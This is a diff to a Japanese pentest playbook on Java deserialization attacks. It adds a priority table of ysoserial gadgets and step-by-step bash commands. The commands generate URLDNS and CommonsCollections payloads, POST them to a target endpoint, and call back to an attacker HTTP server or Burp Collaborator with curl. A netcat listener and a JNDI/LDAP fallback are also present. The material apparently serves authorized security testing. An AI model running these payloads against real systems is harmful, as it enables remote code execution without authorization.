@@ -36,7 +36,7 @@
    - バイト列先頭 `AC ED 00 05`（16進）= Java シリアライズデータのマジックバイト
    - `Content-Type: application/x-java-serialized-object`
 2. allowlist が実装されているか（通常クラスを送って `ClassNotFoundException` に "not allowed" / "accept" 等の文言があるか）
-3. ターゲット JVM のクラスパスに既知のガジェットライブラリがあるか
+3. ターゲット JVM のクラスパスに既知のガジェットライブラリがあるか（クラスパスを直接確認できることは実機ペネトレではほぼ不可能。**URLDNS ガジェット + DNS コールバック**で間接的に存在を確認するのが定石 — 後述）
 
 **攻撃者の思考トレース**:
 allowlist で通常クラスが弾かれる = `resolveClass()` は保護されている。
@@ -96,8 +96,44 @@ Object proxy = Proxy.newProxyInstance(
 
 クラスパス上にガジェットライブラリが存在する場合、ysoserial でペイロードを生成して送信する。
 
+**ysoserial 代表ガジェット早見表（クラスパス未確認時の試行優先順）:**
+
+| 優先 | ガジェット名 | 必要ライブラリ | 用途 |
+|---|---|---|---|
+| **1（最優先）** | `URLDNS` | JDK 標準のみ（追加 jar 不要）| DNS コールバック確認 — デシリアライズが「到達して動く」かを外部依存なしで確認 |
+| 2 | `CommonsCollections1` | Commons Collections 3.1 | RCE（commons-collections 3.1 用）|
+| 3 | `CommonsCollections6` | Commons Collections 3.1 / 3.2 / 4.x | RCE（Java 8+ 全域対応版・CC1 が刺さらない場合）|
+| 4 | `CommonsBeanutils1` | Commons BeanUtils 1.x | RCE（BeanUtils が入っている Spring / Struts 環境で有効）|
+| 5 | `Spring1` / `Spring2` | Spring Framework | RCE（Spring 系アプリ向け）|
+| 6 | `Hibernate1` | Hibernate ORM | RCE（Hibernate 利用の JPA アプリ向け）|
+| 7 | `Jdk7u21` | JDK 7u21 以下 + JDK 8 初期 | RCE（パッチ前 JDK 固有）|
+| 8 | `CommonsCollections2/3/4/5/7` | CC 4.0 系 | RCE（バージョン別）|
+
+**URLDNS で先に「デシリアライズが動くか」を確認:**
+
 ```bash
-# [Attacker] ysoserial でガジェットペイロード生成
+# [Attacker] Step 1: URLDNS ガジェット生成（DNS コールバックで到達確認）
+# — 外部 jar 依存なし・クラスパスに何もなくても動く・副作用が DNS クエリのみ
+java -jar ysoserial.jar URLDNS "http://[COLLAB_SUBDOMAIN].burpcollaborator.net" > urldns_payload.bin
+# または interactsh / requestbin 等の OAST インフラを使う
+
+# [Attacker] Step 2: ペイロードをエンドポイントへ送信
+curl -X POST http://[TARGET]/[ENDPOINT] \
+  --data-binary @urldns_payload.bin \
+  -H "Content-Type: application/x-java-serialized-object"
+
+# [Attacker] Step 3: DNS コールバック到達を観測
+# → 到達すれば「デシリアライズが実行された」確認。クラスパス次第で RCE に進む
+# → 到達なし: エンドポイントまで届いていない / 外部 DNS が遮断 / allowlist で弾かれている
+
+# [Attacker] Step 4: DNS コールバック確認後、RCE 系ガジェットに切替
+# CommonsCollections1 から順に試す
+java -jar ysoserial.jar CommonsCollections1 "curl http://[ATTACKER_HTTP_SERVER]/cc1-check" > cc1_payload.bin
+java -jar ysoserial.jar CommonsCollections6 "curl http://[ATTACKER_HTTP_SERVER]/cc6-check" > cc6_payload.bin
+```
+
+```bash
+# [Attacker] ysoserial でガジェットペイロード生成（RCE 確定後）
 java -jar ysoserial.jar [GADGET_NAME] "[COMMAND]" > payload.bin
 
 # エンドポイントに送信（プロトコルに応じて調整）
@@ -131,14 +167,15 @@ nc -lvnp [PORT]
 |---|---|
 | Proxy 送信も `resolveProxyClass()` でブロックされる | 両経路が保護済み → この手法は使えない |
 | ガジェットライブラリがクラスパスにない | クラスロードは確認できても RCE に繋がらない → SSRF / 情報漏洩系の影響評価に切り替える |
-| エンドポイントがバイト列を受け付けない | プロトコルが違う（XML / JSON 等）→ `XXE.md` や `Deserialization_Other.md` を確認 |
+| エンドポイントがバイト列を受け付けない | プロトコルが違う（XML / JSON / YAML 等）→ `Deserialization_Other.md` を確認（XML は XStream / XXE の別系統、JSON は Jackson polymorphic / SnakeYAML / FastJSON 等を扱う。`XXE.md` が正しい誘導先ではない）|
+| RCE 系ガジェット全て失敗 / URLDNS はコールバック来るが RCE に繋がらない | クラスパスにガジェットライブラリが無い / `jdk.serialFilter` で実行ブロック | **JNDI / RMI フォールバック**: アプリが JNDI Lookup を内部で行っているなら Log4Shell 類似の LDAP 経路（Jackson / Fastjson / SnakeYAML の場合は `Deserialization_Other.md`）/ または影響スコープを「到達確認（URLDNS 成立）」として reporting で留める |
 
 ---
 
 ### 注意点・落とし穴
 
 - **ガジェットのバージョン依存**: ysoserial のガジェットはライブラリのバージョンに依存する。Commons Collections 3.x 向けと 4.x 向けは別ペイロード。
-- **Java バージョン制限**: JDK 8 以降はセキュリティマネージャや `jdk.serialFilter` でデシリアライズ自体をブロックできる。エラーが `InvalidClassException` や `filter status: REJECTED` の場合はこれを疑う。
+- **Java バージョン制限**: `jdk.serialFilter`（JEP 290）は **JDK 9 で導入・JDK 8u121 にバックポート**。「JDK 8 以降」全域が対象ではなく、JDK 8u120 以前は適用されない。エラーが `InvalidClassException` / `filter status: REJECTED` の場合は有効化されていると判断。JDK バージョンを先に確認して試行優先度を調整する。
 - **allowlist の確認が先**: allowlist がない環境ではこのバイパスを考える前に通常のデシリアライズ攻撃が直接使える。バイパスを試みるのは allowlist の存在を確認してから。
 
 ---
